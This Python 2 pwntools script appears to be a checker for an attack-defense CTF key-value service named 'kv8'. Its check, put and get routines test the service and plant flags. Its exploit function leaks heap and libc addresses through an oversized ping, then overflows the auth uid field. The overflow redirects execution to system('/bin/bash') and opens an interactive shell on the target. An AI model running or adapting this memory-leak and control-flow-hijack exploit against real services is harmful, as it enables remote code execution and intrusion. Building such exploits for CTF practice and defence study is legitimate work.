import sys

import enum

PORT = 4242

argvv = [] + sys.argv
from pwn import *



def cmd_ping(io, leak=0):
    CMD_PING = 4
    ping = "ping" + "\x00" + "\x00" * leak
    header1 = struct.pack("L", CMD_PING) + struct.pack("L", len(ping) + 1)
    packet1 = header1 + ping + "\x00"
    io.send(packet1)
    respheader = struct.unpack("LL", io.recv(16))
    l = respheader[1]
    return io.recv(l)


def cmd_auth(io, struid):
    CMD = 0
    l = len(struid)
    if l > 0xff:
        raise Exception("l > 0xff")
    body = struct.pack("B", l) + struid
    header1 = struct.pack("L", CMD) + struct.pack("L", len(body))
    packet = header1 + body
    io.send(packet)
    res = struct.unpack("LL", io.recv(16))
    print "auth res ", res
    return res;


def cmd_put(io, k, v):
    CMD = 2
    body = struct.pack("BB", len(k), len(v)) + k + v
    header1 = struct.pack("L", CMD) + struct.pack("L", len(body))
    packet = header1 + body
    io.send(packet)
    res = struct.unpack("LL", io.recv(16))
    return res


def cmd_get(io, k):
    CMD = 3
    body = k
    header1 = struct.pack("L", CMD) + struct.pack("L", len(body))
    packet = header1 + body
    io.send(packet)
    res = struct.unpack("LL", io.recv(16))
    if res[0] == 200:
        l = res[1]
        return io.recv(l)
    else:
        return None



def cmd_quit(io):
    CMD_QUIT = 5
    header1 = struct.pack("L", CMD_QUIT) + struct.pack("L", 0)
    packet = header1
    # open("auth")
    io.send(packet)
    res = struct.unpack("LL", io.recv(16))
    print "quit res ", res
    l = res[1]
    goodby = io.recv(l)
    print "goodby", goodby
    return res


# def put("")


def exploit(host):
    io = connect(host)
    # exe = ELF("./kv8")
    libc = ELF("./libc.so.6")
    ctx_uid_diff = 0x55612d9b42b0 - 0x55612d9b4260
    # malloc 0 0x55612d9b4260
    # malloc 1 0x55612d9b42b0
    leak1 = cmd_ping(io, leak=512)
    root_ctx_ptr = struct.unpack("L", leak1[16 * 4 + 2:16 * 4 + 2 + 8])[0]
    exit_ptr = struct.unpack("L", leak1[16 * 3 + 10:16 * 3 + 10 + 8])[0]
    uid_ptr = root_ctx_ptr + ctx_uid_diff
    print "root_ctx_ptr", hex(root_ctx_ptr)
    print "uid_ptr", hex(uid_ptr)
    print "exit_ptr", hex(exit_ptr)
    libc.address = exit_ptr - libc.sym.exit
    print "libc base addr", hex(libc.address)
    print "continue"
    sys.stdin.readline()
    padding = cyclic(256)
    print "padding", padding
    padding = padding[:padding.find("ablaabma")]
    rdi = struct.pack("L", uid_ptr)
    rip = struct.pack("L", libc.sym.system)
    padding += rdi + rip + 'e' * 100
    # RAX  0x616f6261616e6261 ('abnaaboa')
    # RDI  0x616d6261616c6261 ('ablaabma')
    # call rax
    uid = '/bin/bash\x00' + padding
    uid = uid[:255]
    cmd_auth(io, uid)
    leak2 = cmd_ping(io, leak=512)
    # print 'leak', hexdump(leak)
    cmd_quit(io)
    io.interactive()


class Status(enum.Enum):
    OK      = 101
    CORRUPT = 102
    MUMBLE  = 103
    DOWN    = 104
    ERROR   = 110

def quit(code, message=None):
    if message is not None:
        print message
    assert(type(code) == Status)
    sys.exit(code)

def connect(host):
    if args.LOCAL:
        io = process("./kv8")

        print io.pid
        print "continue"
        return io
    else:
        io = remote(host, PORT)
        return io

def info(host):
    quit(Status.OK)
    pass


def randomid():
    return "".join([random.choice(string.ascii_lowercase) for i in range(10)])


def check(host):
    try:
        io = connect(host)
    except:
        quit(Status.DOWN, "connection failed")
        return

    uid = randomid()
    k = randomid()
    v = randomid()
    try:
        res = cmd_auth(io, uid)
        if res[0] != 200 or res[1] != 0:
            quit(Status.MUMBLE, 'auth failed')

        remote_value = cmd_get(io, k)
        if remote_value is not None:
            quit(Status.MUMBLE, 'could read value before it was put')

        res = cmd_put(io, k, v)
        if res[0] != 200 or res[1] != 0:
            quit(Status.MUMBLE, 'check-put failed')

        remote_value = cmd_get(io, k)
        if remote_value is None:
            quit(Status.MUMBLE, 'could not read value after put')

        res = cmd_ping(io)
        if "ping pong" not in res:
            quit(Status.MUMBLE, 'ping pong failed')

        res = cmd_quit(io)
        if res[0] != 200 or res[1] != 0:
            quit(Status.MUMBLE, 'check-quit failed')
    except Exception as e:
        quit(Status.MUMBLE, "exception " + str(type(e)))

    try:
        io.close()
    except:
        pass
    quit(Status.OK)



def flag_put(host, id, flag):
    try:
        io = connect(host)
    except:
        quit(Status.DOWN, "connection failed")
        return

    try:
        res = cmd_auth(io, id)
        if res[0] != 200 or res[1] != 0:
            quit(Status.MUMBLE, 'put auth failed')

        res = cmd_put(io, "flag", flag)
        if res[0] != 200 or res[1] != 0:
            quit(Status.MUMBLE, 'put failed')
    except Exception as e:
        quit(Status.MUMBLE, "exception " + str(type(e)))

    try:
        io = connect(host)
    except:
        quit(Status.DOWN, "connection failed")
        return
    try:
        res = cmd_auth(io, id)
        if res[0] != 200 or res[1] != 0:
            quit(Status.MUMBLE, 'put auth2 failed')

        remote_value = cmd_get(io, "flag")
        if remote_value is None or remote_value != flag:
            quit(Status.MUMBLE, 'could not read flag after put')
        io.close()
    except Exception as e:
        quit(Status.MUMBLE, "exception " + str(type(e)))
    quit(Status.OK)


def flag_get(host, id, flag):
    try:
        io = connect(host)
    except:
        quit(Status.DOWN, "connection failed")
        return
    try:
        res = cmd_auth(io, id)
        if res[0] != 200 or res[1] != 0:
            quit(Status.MUMBLE, 'put auth2 failed')

        remote_value = cmd_get(io, "flag")
        if remote_value is None or remote_value != flag:
            quit(Status.MUMBLE, 'could not read flag after put')
        io.close()
    except Exception as e:
        quit(Status.MUMBLE, "exception " + str(type(e)))
    quit(Status.OK)


def main():
    # ./checker.py info
    # ./checker.py check 6.6.10.2
    # ./checker.py put 6.6.10.2 qweq-qweq-qweq ABCDEF1234567890ABCDEF123456789= 1
    # ./checker.py get 6.6.10.2 qweq-qweq-qweq ABCDEF1234567890ABCDEF123456789= 1
    # self_file, action, args = argvv
    action = argvv[1]
    if action == 'exploit':
        exploit(argvv[2])
    if action == 'info':
        quit(Status.OK)
    else:
        host = argvv[2]
        if action == 'check':
            check(host)
        else:
            id = argvv[3]
            flag = argvv[4]
            if action == 'put':
                flag_put(host, id, flag)
            elif action == 'get':
                flag_get(host, id, flag)


if __name__ == "__main__":
    main()
